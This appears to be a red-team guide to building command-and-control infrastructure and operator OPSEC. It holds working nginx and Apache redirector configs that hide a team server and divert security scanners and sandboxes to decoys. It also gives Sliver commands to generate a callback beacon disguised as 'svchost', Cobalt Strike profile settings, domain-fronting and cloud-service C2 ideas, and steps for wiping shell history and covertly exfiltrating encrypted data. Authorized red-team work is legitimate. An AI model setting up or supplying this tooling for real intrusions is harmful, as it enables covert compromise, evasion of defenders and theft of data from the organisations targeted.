---
title: "C2 Infrastructure & Operational OPSEC"
description: "Command and control infrastructure design, redirectors, domain fronting, malleable profiles, and operator OPSEC"
tags:
  - Red Team
  - C2
  - Infrastructure
  - OPSEC
  - Redirectors
---

# C2 Infrastructure & Operational OPSEC

---

## 1. Infrastructure Layout (Segmented Design)

```text
[ INTERNET ]
     |
     v
+---------------------+ +----------------------------+

| SMTP / Phishing | | C2 Long-Haul Redirector |
| mail.attacker.com | | cdn-relay.attacker.com |
| (VPS, categorize!) | | (nginx mTLS/Apache proxy) |
+---------------------+ +-------------+--------------+
                                                |
                                   +------------v-------------+
                                   | Team Server (NEVER |
                                   | directly exposed!) |
                                   | C2 / TG / Sliver |
                                   +--------------------------+
                                                |
                                   +------------v-------------+
                                   | Payload Delivery Host |
                                   | stage.attacker.com |
                                   | (short-lived, per-op) |
                                   +--------------------------+
```

!!! danger "Core Infrastructure Rules"
    1. **Never expose the team server directly** — always through a redirector.
    2. **One redirector per campaign/objective** — burn one, keep the others.
    3. **Separate OSINT/operator VMs from C2 VMs** — no cross-contamination of identities.
    4. **Never log into personal accounts** from infrastructure IPs (Google/Microsoft correlate).
    5. **Rotate infrastructure per engagement** and never reuse payloads between clients.

---

## 2. HTTP/HTTPS Redirector (nginx + Apache)

=== " nginx — Profile-Filtered Redirector"

    ```nginx
    # /etc/nginx/sites-enabled/redirector
    # Only requests matching the C2 profile (URI + UA + Host) are forwarded.
    # Everyone else (sandboxes, scanners, blue team) gets a decoy website.

    server {
        listen 443 ssl http2;
        server_name cdn-relay.<DOMAIN>;

        ssl_certificate /etc/letsencrypt/live/cdn-relay.<DOMAIN>/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/cdn-relay.<DOMAIN>/privkey.pem;
        # --- C2 filter: forward only if URI + User-Agent match the profile ---
        location /api/v1/updates {
            if ($http_user_agent !~ "Mozilla/5.0 \(Windows NT 10.0; Win64; x64\)") {
                return 302 https://www.bing.com;
            }
            proxy_pass https://<TEAM_SERVER_IP>:8443;
            proxy_ssl_verify off;
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        # --- Everything else: decoy site (a real-looking blog / corporate page) ---
        location / {
            root /var/www/decoy;
            index index.html;
            try_files $uri $uri/ =404;
        }
    }
    ```

=== " Apache mod_rewrite Filter"

    ```apache
    # Forward only requests from the exact payload User-Agent + URI
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit" [NC]
    RewriteCond %{REQUEST_URI} "^/api/v1/updates$"
    RewriteRule ^(.*)$ https://<TEAM_SERVER_IP>:8443$1 [P,L]
    # Block known scanner / sandbox ASNs and security vendor ranges
    RewriteCond %{REMOTE_ADDR} ^(34\.|35\.|104\.) [OR]
    RewriteCond %{HTTP_USER_AGENT} "(urlscan|Shodan|Censys|VirusTotal|Any.Run)" [NC]
    RewriteRule ^(.*)$ https://www.bing.com [R=302,L]
    ```

---

## 3. Domain Fronting & CDN Delivery

```text
Concept: the TLS SNI shows a LEGITIMATE domain (e.g. a big CDN hostname) while the
inner HTTP Host header points to YOUR domain — the CDN routes by Host but the network
sees the benign SNI. Most major providers have mitigated this, but variants exist:

  - CDN "Origin Rules" / "Custom Domains" that let you control the edge behavior
  - Azure CDN / CloudFront with a custom origin matching your redirector
  - Cloudflare Workers in front of the C2 (mTLS + Cloudflare Tunnel with access rules)
  - Fastly / Google Cloud CDN equivalent configuration

Also consider "living off legitimate services" for egress:
  - GitHub / GitLab / Dropbox / Slack / Discord / OneDrive as payload & C2 channels
  - Microsoft Graph API (Teams messages, OneDrive, Outlook drafts) as C2
  - DNS over HTTPS (DoH) resolvers for DNS C2 to look like normal HTTPS traffic
```

---

## 4. Malleable C2 Profiles (Sliver / Havoc / Cobalt Strike)

```bash
# --- Sliver: profile-based HTTP listener + redirector-friendly config ---
sliver > http -l 8443 --domain cdn-relay.<DOMAIN> --website decoy \
              --persistent --long-poll-timeout 1500

sliver > https -l 8443 --domain cdn-relay.<DOMAIN> --lets-encrypt
# Sliver session hygiene
sliver > sessions
sliver > use <SESSION_ID>
sliver > info
sliver > socks5 start --host 0.0.0.0 --port 1080
sliver > shellcode --format c --save /tmp/beacon.c # Stager for custom loader
sliver > generate beacon --mtls <LHOST>:8888 --os windows --arch amd64 \
         --seconds 60 --jitter 30 --name svchost --save /tmp/payload
# --- Cobalt Strike malleable profile essentials ---
# set sample_name "notepad.exe";
# set sleep_time "60000"; set jitter "40";
# set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...";
# http-get { set uri "/api/v1/updates /cdn/static /assets/js/app"; ... }
# http-post { set uri "/api/v1/telemetry"; ... }
# profile verbs: client { metadata { base64; prepend "session=";} } etc.
# --- Validate profile syntax & visualize the traffic ---
./c2lint -T ./profiles/malleable.profile
```

---

## 5. Operator OPSEC Checklist

```bash
# SECURITY BASELINE FOR OPERATOR VMs
# - Dedicated VM per engagement (snapshot & rollback after)
# - No personal accounts, no bookmarks, no browser sync
# - Always use a VPN / residential proxy matching the target's geography
# - Kill all telemetry: disable Microsoft/Google account sign-ins in the VM
# - Disk encryption + no clipboard sharing between "persona" and "operator" VMs
# ARTIFACT HYGIENE
# - Clear command history: history -c && rm -rf ~/.bash_history
# - Clean payload staging directories after each delivery
# - Remove tools & logs from every pivot host at debrief
# - Prefer living-off-the-land binaries to fresh tooling
# - Avoid writing files to disk (execute in memory: reflective loading)
# EXFIL OPSEC
# - Chunk & "blend" exfil into legitimate-looking traffic patterns
# - Encrypt before exfil (e.g. 7z with AES-256)
# 7z a -p"<PASS>" -mhe=on -v5m exfil.7z /sensitive/path/
# - Use the same protocol as legitimate business traffic (HTTPS/Teams/cloud)
# - Rate-limit exfil to avoid volume-based detections
# DEBRIEF DATA (keep a running log for the blue team)
# Timestamp | ATT&CK ID | Technique | Source host | Destination | Raw artifact
```